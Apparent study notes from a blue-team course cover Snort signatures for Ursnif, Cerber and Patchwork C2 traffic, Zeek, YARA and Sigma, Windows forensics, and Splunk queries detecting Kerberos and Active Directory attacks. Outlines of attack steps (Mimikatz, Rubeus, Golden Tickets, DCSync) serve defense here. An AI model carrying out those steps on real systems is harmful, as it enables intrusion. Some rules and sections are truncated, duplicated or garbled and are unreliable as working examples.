Test the rule on the ursnif.pcap file:

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
Example 2: Cerber Detection

alert udp $HOMENET any -> $EXTERNALNET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fastpattern; pcre:"/^[af0-9]{7}$/R"; detectionfilter:track bysrc, count 1, seconds 60; sid:2816763; rev:4;)
This rule targets Cerber malware:
dsize:9; : restricts the rule to datagrams with a payload of 9 bytes.
content:"hi", depth 2, fastpattern; : search for "hi" in the first two bytes.
pcre:"/^[af0-9]{7}$/R"; : Uses a regular expression to search for seven hexadecimal characters after "hi".
detectionfilter limits the frequency of alerts per source.

Test the rule on the cerber.pcap file:

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
Example 3: Patchwork Detection

alert http $HOMENET any -> $EXTERNALNET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow: established,toserver; httpmethod; content:"POST"; httpuri; content:".php?profile="; httpclientbody; content:"ddager=", depth 7; httpclientbody; content:"&r1=", distance 0; httpheader; content:!"Accept"; httpheader; content:!"Referer|3a|";
This rule detects Patchwork APT malware by looking for specific HTTP patterns:
flow:established,toserver; : specifies outgoing connections.
httpmethod; content:"POST"; : searches for HTTP POST requests.
httpclientbody and httpheader filter for specific content and absence of headers.

Test with the patchwork.pcap file:

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
Example 4: Patchwork Detection (SSL)

alert tcp $EXTERNALNET any -> $HOMENET any (msg:"Patchwork SSL Cert Detected"; flow: established,fromserver; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
This SSL rule detects Patchwork malware by looking for patterns in SSL certificates:
content:"|55 04 03|"; : Targets common name fields in X.509 certificates in ASN.1 format.
distance and within refine the search.

Run with the patchwork.pcap file:

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
Summary of Orders and Tests
Test a rule with a PCAP file:
Execution for each specified pcap file (ursnif.pcap, cerber.pcap, etc.).
Option -A cmg allows you to format alerts to display them quickly.

Each Snort rule example focuses on specific patterns in network traffic to identify behaviors associated with malware like Ursnif, Cerber, or Patchwork. These rules can be adapted and optimized according to the needs of your security infrastructure.
Zeek Fundamentals 
Zeek is an open-source network traffic analyzer widely used to identify suspicious or malicious network activities. It is also very effective for network troubleshooting and performance measurement. Zeek generates log files that provide detailed information on all network activity, making it a valuable tool for cybersecurity teams (blue teams). These logs contain detailed records of connections and activities at the application layer, such as DNS queries, HTTP sessions, etc. Additionally, Zeek features enable deep analysis and detection that goes beyond simple logging.

One of Zeek's most notable features is its powerful scripting language, which allows users to create custom scripts similar to Suricata's rules. This language allows security teams to develop tailored network analysis and intrusion detection strategies.
Zeek Detection Features

Rather than just signature-based detection, Zeek offers semantic abuse detection, anomaly detection and behavioral analysis.

Zeek Operating Modes

Zeek works in several modes:
Fully passive traffic analysis: Does not generate network traffic but observes and analyzes existing traffic.
Libpcap interface for packet capture: Uses libpcap for network packet capture.
Real-time and offline analysis: Can be run in real-time mode or with PCAP files for offline analysis.
Cluster support for large-scale deployments: Zeek can be deployed in cluster mode to analyze large amounts of network traffic in a distributed manner.

Zeek architecture

Zeek's architecture is composed of two main components:
Event engine (kernel):
Transforms the stream of incoming packets into a series of high-level events that describe network activity.
These events are policy neutral, they describe what happened without interpreting it (for example, an HTTP request is logged as an httprequest event).
Script interpreter:
Runs event handlers written in the Zeek scripting language (Zeek scripts), which specify site security policies.
Events generated by the Zeek core are processed sequentially by scripts.

Zeek events are primarily defined in .bif files located in /scripts/base/bif/plugins/. For a complete list of events, see the Zeek Events documentation.

Zeek Logs

When running Zeek in offline mode with a PCAP file, logs are saved in the current directory. Common logs include:
conn.log: Details IP, TCP, UDP and ICMP connections.
dns.log: Records DNS queries and responses.
http.log: Records details of HTTP requests and responses.
ftp.log: Records FTP requests and responses.
smtp.log: Records SMTP transactions, including sender and recipient details.
Example of http.log:

The http.log file contains fields such as host, uri, referrer, user\agent and status\_code.

For a complete list of Zeek logs and fields, see the Zeek Logs documentation.

Zeek compresses log files hourly using gzip and moves older logs to a directory named by date (YYYY-MM-DD format). To manage these compressed logs, use tools like gzcat (to display the contents) and zgrep (to search the logs).

Zeek also provides zeek-cut, a utility for extracting specific columns from Zeek logs, making log analysis easier.

Zeek Key Features

The main features that make Zeek more efficient are:
Detailed network activity logging: Captures a wide variety of network activities, including application layer protocols (e.g. HTTP, DNS, FTP, SMTP, SSH, SSL).
Inspection of the contents of files exchanged via application layer protocols.
IPv6 Support: Zeek supports IPv6 traffic analysis.
Tunnel detection and analysis: Identifies network tunnels.
Validity checks in protocol analysis.
IDS-like pattern matching: Detection based on suspicious behavior patterns.
Powerful scripting language: Allows you to add custom analyzes and manage states within scripts.
Log output in ASCII by default: Options to integrate with tools like ElasticSearch and DataSeries.
Real-time integration of external inputs: Allows you to analyze flows in real time.
Interface with C libraries: Sharing Zeek events with other programs.
Ability to trigger external processes from the scripting language.

To go further with Zeek

For example rules, scripting basics, and use cases, see the Zeek Examples documentation. If you're just starting out, Zeek's Quick Start Guide is a great resource.

Zeek is an extremely flexible and powerful tool for network traffic analysis, intrusion detection, and network problem diagnosis, offering capabilities far beyond traditional signature-based analysis.

Understanding Windows Internals for Malware Scanning

Understanding the internal workings of Windows is essential to effectively analyzing malware. This makes it possible to interpret their behavior, identify their anchor points in the system, and detect their methods of persistence or escape.

  Restricted access; used by applications.

Decoding 
Common encoding techniques

Encoding is often used to hide or transform data into a different format. Here are the encoding methods most frequently encountered during security analyzes or decoding hidden information.

Base64 encoding
Purpose: Converts data into a readable alphanumeric format, with the characters + and /, and one or more = as padding so that the length is a multiple of 4.
How to spot it: Made up of upper/lower case letters, numbers, often with /, +, and ending with =.
Encoding:

echo "https://www.hackthebox.eu/" | base64
Decoding:

echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
Example:

echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
This code is decoded into:
“do the exercise, don’t copy and paste ;)”

Hexadecimal Encoding (Hex)
Purpose: Represents each character by its ASCII value in hexadecimal.
How to spot it: Only contains characters 0-9 and a-f.
Encoding:

echo "https://www.hackthebox.eu/" | xxd -p
Decoding:

echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
Caesar Cipher / ROT13
Purpose: Shifts each letter of the alphabet by a fixed number (for example, ROT13 = shift of 13 positions).
How to spot it: The characters remain readable, only their order changes. The text maintains a recognizable alphabetical structure.
Encoding/Decoding with ROT13 (reversible):

echo "https://www.hackthebox.eu/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
To decode (same command):

echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Identify the encoding type

For ambiguous strings, online tools like Cipher Identifier (for example: dcode.fr or CyberChef) can help detect the encoding type automatically.

Advanced Encoding vs. Encryption
Encoding: Changes the data format for technical reasons (readability, compatibility) — not secure.
Encryption: Transforms data in an incomprehensible way without a key, for the purpose of confidentiality.
In malware analysis, security testing or reverse engineering, knowing how to recognize and decode these formats allows you to identify hidden data or suspicious behavior.

YARA is a powerful pattern matching tool that helps identify files based on specific patterns and rules. Custom Rules for Targeted Threats: Creation of tailor-made rules to meet specific organizational needs.

How YARA Works
Rule Set: Rules define patterns or behaviors to look for.
File Set: Set of files or memory captures to analyze.
YARA engine: Compares file contents byte by byte with defined rules.
Detection Output: If patterns are found, YARA marks the file as detected.

Structure of a YARA Rule
Basic Structure:

rule RuleName {
    meta:
        author = “Author Name”
        description = "Rule description"
    thongs:
        $string1 = "exampletext"
        $string2 = { 4A 2D 1C }
    condition:
        all of them
}
Components of a YARA Rule:
Rule Header: Starts with the rule keyword, followed by the rule name.
Meta Section: Contains metadata such as author, description, version and references.
Strings section: Defines text strings, hexadecimal patterns, or regular expressions to search for.
Condition section: Specifies the conditions under which the rule is triggered.

rule RansomwareWannaCry {

all of them: All specified strings must match.

Sigma and Sigma Rules 
Sigma is a generic, standardized signature format that allows SOC analysts to create, share and use detection rules for log analysis across different platforms. Written in YAML, Sigma rules provide cross-platform portability, allowing analysts to write a rule once and deploy it to various SIEM and EDR systems.

Main Use Cases for Sigma Rules
Universal Log Analysis: Write detection rules once and convert them to formats compatible with various SIEMs.
Community Rules Sharing: Access and contribute to a growing library of community-shared Sigma rules.
Incident Response: Efficiently search logs for indicators during incidents.
Proactive Threat Hunting: Use Sigma rules to detect anomalies or threats in data sets.
Integration with Automation Tools: Automate responses using Sigma rules with SOAR platforms.
Customization: Adapt Sigma rules to the specific needs of the environment.
Gap Analysis: Perform a gap analysis by aligning custom rules with community standards.

How Sigma Works

Sigma expresses detection models in a structured format, with rules written in YAML. A Sigma rule includes the following elements:
Title, Description and ID: Basic information about the rule.
Log Source: Specifies the target log type, platform, and application.
Detection Model: Includes search IDs and match conditions.
False Positives, Author and Date: Optional fields to provide context.

Sigma conversion (sigmac and pySigma)

Sigma's power lies in its ability to be converted. Tools like sigmac (and increasingly pySigma) transform Sigma rules into queries or configurations compatible with popular SIEMs (ElasticSearch, QRadar, Splunk, etc.).

Key Components of a Sigma Rule
Title: Describes the object of detection (for example, "Potential execution of the LethalHTA technique").
ID: Unique identifier (UUID is recommended).
Status: Status of the rule (for example, stable, testing, experimental).
Description: Brief explanation of what the rule detects.
References: Links to supporting articles or research.
Author: Name or pseudonym of the creator of the rule.
Date: Creation date in YYYY/MM/DD format.
Log Source: Specifies the log source and platform (for example, category: process_creation, product: windows).
Detection Model:
Selection: Specifies the patterns to match in the logs.
Condition: Describes the relationship between patterns (for example, condition: selection).

Detection Modifiers

Modifiers refine detection searches:
contains: Uses wildcards on both ends of a value (for example, CommandLine|contains).
startswith / endswith: Uses wildcards at one end only.
re: Matching based on regular expressions.

Example of using modifiers:

detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    Image|endswith: '\mshta.exe'
  condition: selection

Sigma conditions link detection elements, using operators like:

Windows Forensics Overview 
NTFS (New Technology File System)

NTFS is Microsoft's file system, known for its features that improve performance, security and data integrity. Key forensic artifacts include:
File metadata: Stores timestamps and file attributes, useful for event timeline analysis.
MFT Entries: The Master File Table tracks metadata for all files, providing details even on deleted files.
File Slack and Unallocated Space: Contains remnants of deleted files.
File signatures: Used to identify files even if their extensions are changed.
USN Log: Records file changes, useful for investigating changes.
LNK Files: Shortcuts that reveal file and program access history.
Prefetch Files: Indicate recently executed programs.
Registry Hives: Log system configurations and can reveal traces of unauthorized changes.
Shellbags: Follow folder navigation, highlighting the directories consulted.
Thumbnail cache: Stores previews of recently viewed images and documents.
Recycle Bin: Retains deleted files, providing information about user actions.
Alternative data streams (ADS): Hidden data associated with files, sometimes exploited by malware.
Volume Shadow Copies: File system snapshots for data recovery.
Security Descriptors and ACLs: Store file permissions, useful for analyzing access rights and security violations.
Windows Event Logs

Windows event logs record system and application events, capturing a range of user and system activity. Located in C:\Windows\System32\winevt\logs, these logs help detect:
System errors: Problems with the operating system or applications.
Security Events: Authentication attempts, policy changes, and access controls.
Application Events: Logs from specific software, often useful in identifying exploitation attempts.
Execution artifacts

Execution artifacts document traces of executed programs and scripts, providing insight into user actions and malware activity. Notable artifacts include:
Prefetch Files: Follows the execution metadata (file paths, number of executions).
Shimcache: Records program execution for compatibility, useful for identifying recent activity.
Amcache: Stores executable details (file paths, digital signatures, last execution).
UserAssist: Tracks applications run by the user, displaying names, accounts and timestamps.
RunMRU Lists: Records recently executed commands and programs.
Jump Lists: Documents recent files and tasks associated with applications.
Shortcut files (LNK): Provide execution paths, timestamps, and user interactions.
Recent Items: Follows recently accessed files.
Windows Event Logs: Records events related to process creation and termination.
Persistence on Windows

Persistence methods allow attackers to maintain access to a system. These methods leverage system components like registry keys, scheduled tasks, and services.
Registry keys for persistence
Run/RunOnce:
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Run
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
WinLogon keys:
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Getting Started Keys:
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
Scheduled Tasks (Schtasks)

Tasks scheduled in C:\Windows\System32\Tasks are stored as XML files, detailing task schedules and orders. These files should be examined to spot suspicious entries.
Services

Windows services run processes in the background. Malicious actors can create or modify services to maintain persistence. The registry key for services is: HKEYLOCALMACHINE\System\CurrentControlSet\Services.
Web browser forensics

Web browser analysis can reveal browsing habits, user interactions and potentially harmful actions. Key artifacts include:
Browsing history: Tracks sites visited, timestamps and frequency.
Cookies: Stores session details, preferences and authentication data.
Cache: Contains cached web pages and images, showing sites accessed even if the history has been cleared.
Favorites: Indicates frequently visited pages.
Download History: Lists downloaded files, their original URLs and timestamps.
Autofill data: Stores information for forms (e.g. names, addresses).
Session Data: Tracks active sessions, tabs, and open windows.
Extensions and add-ons: List of installed extensions and their configurations.
SRUM (System Resource Usage Monitor)

Introduced in Windows 8, SRUM tracks application and resource usage. Located in C:\Windows\System32\sru\sru.db, this SQLite database records application profiles and resource usage, helping to:
Application profiling: Shows running applications and their paths.
Resource Consumption: Records CPU, network, and memory usage.
Timeline Reconstruction: Constructs a timeline of application usage and system events.
User and system context: Associates activities with specific users, which helps identify malicious actors.
Malware Detection: Tracks unusual patterns of applications or resources, which may indicate the presence of malware.
Incident Response: Provides quick information on recent activities for rapid response to threats.

Ddetecting Password Spraying 
Password Spraying Attack Overview

Password Spraying is a targeted attack that:
Attempts a limited number of common passwords across multiple user accounts.
Avoids account lockout policies by using only a few password attempts per account.
Is designed to evade detection by exploiting weak passwords across a wide range of users, rather than brute-forcing individual accounts.

Example: An attacker uses the Spray tool to test a limited set of passwords on multiple accounts in a network.

Detection Opportunities
Log-Based Metrics to Detect Password Spraying

Monitoring Windows logs for Password Spraying can help detect anomalies, especially when multiple failed login attempts (Event ID 4625) from different user accounts are made from a single IP address over a short period of time.

Main events to monitor for Password Spraying detection:
4625 - Connection failed
Track failed logins for different accounts from a single source.
4768 - Kerberos Ticket Request (TGT)
ErrorCode 0x6: Invalid user attempts.
ErrorCode 0x12: Attempts to user disabled.
4776 - NTLM authentication
ErrorCode 0xC000006A: Invalid NTLM users.
ErrorCode 0xC0000064: Bad NTLM password.
4648 - Attempt to connect with explicit credentials
Identifies credential abuse.
4771 - Kerberos pre-authentication failure

Detecting Kerberoasting & AS-REProasting 
E. Golden Ticket detection via Splunk

This Splunk query helps detect suspicious activity related to Golden Tickets, by identifying service ticket requests (TGS) that are not preceded by the classic Kerberos authentication steps (AS-REQ / AS-REP). This type of behavior may indicate the use of a TGT crafted by an attacker.

Splunk query

index="goldenticketattack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin time span=1m
| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
| where totalrequests > 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
Explanation of the query
Data selection
index="goldenticketattack": Search in the index dedicated to detecting Golden Ticket attacks.
sourcetype="bro:kerberos:json": Uses Kerberos logs provided by Zeek/Bro in JSON format.
Customer filtering
where client!=”-”: Discard events where the client field is empty or absent.
Temporal grouping
bin time span=1m: Groups events per minute to detect bursts of suspicious requests.
Aggregation
stats count as totalrequests: Total number of requests per group.
values(requesttype): Types of requests observed (e.g. TGS, AS-REQ).
dc(requesttype): Number of distinct request types.
id.origh / id.resph: source IP (client) and destination IP (often the domain controller).
Behavioral filtering
totalrequests > 10: Focuses on clients sending a lot of requests in a short period of time.
uniquerequesttypes == 1 and requesttypes == "TGS": Reports cases where only the TGS request is present, without a trace of AS-REQ/AS-REP.

Interpretation
A client that only sends TGS type requests without any prior authentication is highly suspicious. This may mean that the attacker injected a Golden Ticket, allowing them to directly access services without authenticating with the KDC.

To investigate
Source IP address (id.origh): Is this an authorized machine?
Frequency: Does this behavior repeat in multiple intervals?
Destination IP (id.resp_h): Does it correspond to a domain controller?
Customer or user: Is this a known service or an abnormal account?
Detecting Pass-the-Hash 
Overview of the Overpass-the-Hash (Pass-the-Key) attack

Overpass-the-Hash (Pass-the-Key) allows attackers to authenticate through Kerberos using stolen password hashes, allowing them to request Kerberos Ticket Granting Tickets (TGTs) and gain unauthorized access to systems without relying on NTLM.
Stages of attack
Extraction of user hashes: The attacker uses tools like Mimikatz to obtain the NTLM hash of a logged in user, requiring local administrator privileges.
TGT Request with Rubeus: The attacker uses Rubeus to create a raw AS-REQ request for a TGT of a specified user. This step does not require elevated privileges, making it more discreet.
Ticket Submission: The attacker injects the requested TGT into the current session, similar to the Pass-the-Ticket attack, to perform lateral moves.

Opportunities for detecting the Overpass-the-Hash attack
Key detection logic
Mimikatz Detection: Artifacts from Mimikatz-based Overpass-the-Hash attacks resemble those from Pass-the-Hash attacks and can be detected using similar techniques.
Rubeus Detection: When Rubeus sends an AS-REQ directly to the domain controller via TCP/UDP port 88, it generates Event ID 4768. However, unusual processes communicating on port 88 to the domain controller, other than lsass.exe, can help identify potential Overpass-the-Hash activity.

Splunk Query Example: Rubeus Detection in Overpass-the-Hash Attack

Description: This query identifies AS-REQ requests sent on port 88 from unusual processes, specifically looking for Event ID 3 with a destination port of 88, while excluding lsass.exe.

Time range: earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explanation of key query components
Filtering events:
Source selection: Filters events from the Sysmon operational log (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3: Captures network connections made by the host, specifically targeting traffic to destport=88 (Kerberos), excluding Image=lsass.exe, as it is a legitimate process accessing Kerberos services.
OR EventCode 1: Captures all process creation events to allow correlation with other suspicious process events.
Event Statistics:
EventStats: Adds the list of processes for each process identifier (processid), stored under process.
Where EventCode=3: Filter for network connection events on port 88.
Aggregation and filtering:
Stats count by Fields: Aggregates events by time, Computer, destip, destport, Image, and process, while calculating the number of occurrences (count).
Fields - count: Removes the count field from the final result for clarity.
Detecting Pass-the-Ticket 
Pass-the-Ticket (PtT) Attack Overview

Pass-the-Ticket (PtT) is a technique that allows attackers to move laterally within a network using Kerberos tickets instead of passwords. With administrative privileges, an attacker can extract valid Kerberos tickets (TGT or TGS) from a compromised system's memory and use them to access resources without needing the user's password.
Pass-the-Ticket Attack Steps:
Kerberos ticket extraction: The attacker uses tools like Mimikatz to extract TGT or TGS tickets from a compromised system.
Authentication with the extracted ticket: The attacker submits the ticket in the current login session, authenticating as the user without needing the password.
Lateral movement: Using the ticket, the attacker can access additional systems or resources on the network.
Kerberos authentication process & security events associated with Windows
Event ID 4624: Successfully connected to a system.
Event ID 4648: Explicit login attempt with credentials.
Event ID 4672: Special connection, indicating administrative privileges.
Event ID 4768: TGT request in Kerberos process.
Event ID 4769: TGS request in Kerberos process.
Event ID 4770: TGS ticket renewal.
Pass-the-Ticket Attack Detection Opportunities
Detection key logic

Detecting PtT attacks requires monitoring Kerberos Service Ticket (TGS) requests issued without a prior TGT request. Attackers can import a TGT directly into a session, creating a gap where a TGS request (Event ID 4769) or ticket renewal (Event ID 4770) does not have an associated TGT request (Event ID 4768). Monitoring inconsistencies in the authentication process can help spot PtT attempts.

Example 1: Detection of TGS ticket requests without prior TGT request

Description: This query searches for Kerberos service ticket requests (4769) and renewals (4770) without a prior TGT request (4768) from the same system, which may indicate an imported TGT.

Time range: earliest=1690392405 latest=1690451745

index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?<srcip4>[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@"
| table time, ComputerName, username, srcip4, servicename, category
Key Components Explained
Filtering events:
Event selection: Filters events to include only Event IDs 4768, 4769 and 4770 in the security log, excluding machine accounts (user!=$).
Regular expressions:
Username Extraction: Extracts the username from the user field for easier identification.
IP Extraction: Extracts IPv4 addresses from srcip, taking into account IPv6 addresses mapped to IPv4 focusing on the IPv4 portion.
Transaction command:
Purpose: Groups events associated by username and srcip4, starting with EventCode 4768 (TGT request).
Settings: maxspan=10h sets a maximum transaction window of 10 hours, allowing long login sessions; keepevicted=true ensures that open transactions remain visible.
Filtering for open transactions:
closed\txn=0: Filters transactions without a closing event, showing cases where TGS tickets or renewals were requested without a prior TGT request.
Displaying results:
Shows relevant fields like time, ComputerName, username, srcip4, servicename, and category for easier analysis.

Example 2: Detection of TGS requests and abnormal behavior

In cases where attackers import TGS tickets without a valid TGT request, anomalies may appear in Event ID 4771 (Pre-authentication failure). By monitoring inconsistencies in failure codes and authentication types, additional PtT attacks can be detected.
Detecting Overpass-the-Hash 
Overview of the Overpass-the-Hash (Pass-the-Key) attack

Overpass-the-Hash (Pass-the-Key) allows attackers to authenticate through Kerberos using stolen password hashes, allowing them to request Kerberos Ticket Granting Tickets (TGTs) and gain unauthorized access to systems without relying on NTLM.
Stages of attack
Extraction of user hashes: The attacker uses tools like Mimikatz to obtain the NTLM hash of a logged in user, requiring local administrator privileges.
TGT Request with Rubeus: The attacker uses Rubeus to create a raw AS-REQ request for a TGT of a specified user. This step does not require elevated privileges, making it more discreet.
Ticket Submission: The attacker injects the requested TGT into the current session, similar to the Pass-the-Ticket attack, to perform lateral moves.

Opportunities for detecting the Overpass-the-Hash attack
Key detection logic
Mimikatz Detection: Artifacts from Mimikatz-based Overpass-the-Hash attacks resemble those from Pass-the-Hash attacks and can be detected using similar techniques.
Rubeus Detection: When Rubeus sends an AS-REQ directly to the domain controller via TCP/UDP port 88, it generates Event ID 4768. However, unusual processes communicating on port 88 to the domain controller, other than lsass.exe, can help identify potential Overpass-the-Hash activity.

Splunk Query Example: Rubeus Detection in Overpass-the-Hash Attack

Description: This query identifies AS-REQ requests sent on port 88 from unusual processes, specifically looking for Event ID 3 with a destination port of 88, while excluding lsass.exe.

Time range: earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explanation of key query components
Filtering events:
Source selection: Filters events from the Sysmon operational log (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3: Captures network connections made by the host, specifically targeting traffic to destport=88 (Kerberos), excluding Image=lsass.exe, as it is a legitimate process accessing Kerberos services.
OR EventCode 1: Captures all process creation events to allow correlation with other suspicious process events.
Event Statistics:
EventStats: Adds the list of processes for each process identifier (processid), stored under process.
Where EventCode=3: Filter for network connection events on port 88.
Aggregation and filtering:
Stats count by Fields: Aggregates events by time, Computer, destip, destport, Image, and process, while calculating the number of occurrences (count).
Fields - count: Removes the count field from the final result for clarity.
Detecting Golden Tickets and Silver Tickets 
Golden Ticket

A Golden Ticket attack involves forging a Ticket Granting Ticket (TGT) to impersonate a domain administrator and gain free access to the entire domain. This attack is difficult to detect because the generated ticket is technically valid and can be created offline by an attacker.
Stages of attack
KRBTGT hash extraction: The attacker extracts the NTLM hash from the KRBTGT account, often via a DCSync attack or by extracting the NTDS.dit and LSASS files.
Creation of the falsified TGT: Using this hash, the attacker forges a TGT granting him domain administrator privileges.
TGT Injection: This ticket is injected into a user session, allowing unauthorized access to domain resources.
Detection Opportunities

Detection is based on certain indicators such as:
Suspicious DCSync activity: Monitor for non-legitimate DCSync requests.
Access to NTDS.dit or LSASS: the Sysmon ID 10 event can alert on access to LSASS for hash extraction.
Pass-the-Ticket Alerts: Using a Golden Ticket resembles Pass-the-Ticket behaviors.

Splunk query example: Golden Ticket detection

Description: This search identifies the potential use of a Golden Ticket by detecting Kerberos tickets (4769 or 4770) that do not have an initial 4768 event (AS-REQ), which may indicate that they have been forged.

Time range: earliest=1690451977 latest=1690452262

index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?<srcip4>[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@*"
| table time, ComputerName, username, srcip4, servicename, category
Silver Ticket

A Silver Ticket attack allows forging service tickets (TGS) to access specific services (e.g. SQL Server) without full authentication to the domain controller. It gives more limited access than the Golden Ticket but remains formidable.
Stages of attack
Service account hash extraction: The attacker obtains the NTLM hash of a target service account.
Creation of a falsified TGS: It forges a service ticket with this hash.
Injection and access: The ticket is injected into a session to access the targeted service.
Detection Opportunities

Key indicators include:
Creation of new user accounts: event ID 4720 can alert on recently created accounts.
Assignment of special privileges: event ID 4672 is used to detect connections with elevated rights.

Example Splunk queries to detect Silver Tickets
Query 1: Comparison between created users and logged in users

Objective: Identify recently created user accounts that log in unexpectedly.

Extraction of created users:

index=main latest=1690448444 EventCode=4720
| stats min(time) as time, values(EventCode) as EventCode by user
| outputlookup users.csv
Comparison with recent connections:

Time range: latest=1690545656

index=main latest=1690545656 EventCode=4624
| stats min(time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user

Summary

Golden Ticket and Silver Ticket attacks take advantage of vulnerabilities in the Kerberos protocol to gain unauthorized access to an Active Directory environment. Detection is based on the correlation of events related to logins, account creation and privilege escalation. Using Splunk to monitor these indicators allows security teams to more effectively spot and respond to these advanced threats.

Unconstrained delegation allows a service to authenticate to other resources on behalf of any user, exposing sensitive data if compromised. Attackers can exploit this vulnerability to extract TGT tickets from memory and move laterally within the network.
Attack steps:
Identify systems with unconstrained delegation enabled.
Access a vulnerable system.
Extract TGTs using tools like Mimikatz.

Extract the TGT of a principal.

Detecting DCSync & DCShadow 
DCSync

DCSync is a technique that allows an attacker to impersonate a domain controller to obtain Active Directory replication data, including password hashes (current and old). This attack can then be used to:
Forge Golden Tickets or Silver Tickets
Perform Pass-the-Hash attacks
Stages of attack
Administrative Access: The attacker gains administrative access on a machine linked to the domain or elevates his privileges.
Request Replication: Using tools like Mimikatz, the attacker uses the DRSGetNCChanges interface to request replication.
Hash Exploitation: The extracted data is used to forge Kerberos tickets or compromise other accounts.
Detection Opportunities
Windows Event ID 4662: Records DS-Replication-Get-Changes operations, which are essential for detecting DCSync activities.
Auditing Configuration: Advanced directory service access auditing must be enabled (disabled by default).

DCShadow

DCShadow is a more advanced attack allowing an attacker to create unauthorized changes in Active Directory without generating standard logs. This involves creating a fake domain controller (rogue DC) that replicates malicious changes to real domain controllers.
Stages of attack
Elevated Access: The attacker must have sufficient privileges to register a domain controller.
Rogue DC Registration: A fake domain controller is registered and makes AD changes (for example, adding a user to the "Domain Admins" group).
Replication of changes: These changes are propagated via the AD replication mechanism.
Detection Opportunities
Event ID 4742: Records changes to computer objects, including ServicePrincipalName (SPN) changes.
Creating an nTDSDSA object: An addition of an nTDSDSA object in the AD schema is often an indicator of DCShadow activity.

DCSync and DCShadow attacks represent serious threats in an Active Directory environment. Their detection is based on monitoring specific events (such as IDs 4662 and 4742) and correlating abnormal behavior on objects in the domain.

Discovery query

This Splunk query analyzes Zeek logs and identifies IP addresses with a large number of RDP connection attempts in a short period of time, which may indicate a brute force attack.

Ddetecting Beaconing Malware 
Overview

Malware using beaconing techniques, such as Cobalt Strike in its default configuration, communicates with its Command & Control (C2) server at regular intervals. By monitoring the intervals between these communications in network logs (here via Zeek), suspicious behavior can be identified.

This guide introduces a Splunk query to detect these regular communication patterns in HTTP traffic.

Configuring the discovery query

This Splunk query analyzes temporal intervals in HTTP traffic to identify repetitive and regular connections — hallmarks of beaconing.
Explanation of the query
Filtering relevant data
index="cobaltstrikebeacon" and sourcetype="bro:http:json" target Zeek HTTP logs (in JSON format) associated with Cobalt Strike malware.
Chronological sorting of events
sort 0 time sorts events in ascending order of time to allow reliable time calculations.
Calculation of time differences
streamstats calculates the time difference (timedelta) between two consecutive events, grouped by source IP, destination IP and destination port.
Calculation of the average interval
eventstats calculates the average interval (avg) between events as well as their total number (total), for each source-destination pair.
Defining a range of acceptable intervals
eval upper=avg1.1 and eval lower=avg0.9 set a margin of ±10% around the average interval to take into account small variations.
Filtering regular intervals
where timedelta > lower AND timedelta < upper keeps events whose interval is close to the average.
Calculation of the regularity percentage
stats aggregates the data and calculates the percentage (prcnt) of events within the regular range for each connection.
Filtering on the regularity threshold
where prcnt > 90 AND total > 10 only keeps connections with more than 90% regularity and at least 10 events — minimum criteria to avoid false positives.

Splunk query

index="cobaltstrikebeacon" sourcetype="bro:http:json" 
| sort 0 time
| streamstats current=f last(time) as prevtime by src, dest, destport
| eval timedelta = time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, destport
| eval upper=avg1.1
| eval lower=avg0.9
| where timedelta > lower AND timedelta < upper
| stats count, values(avg) as TimeInterval by src, dest, destport, total
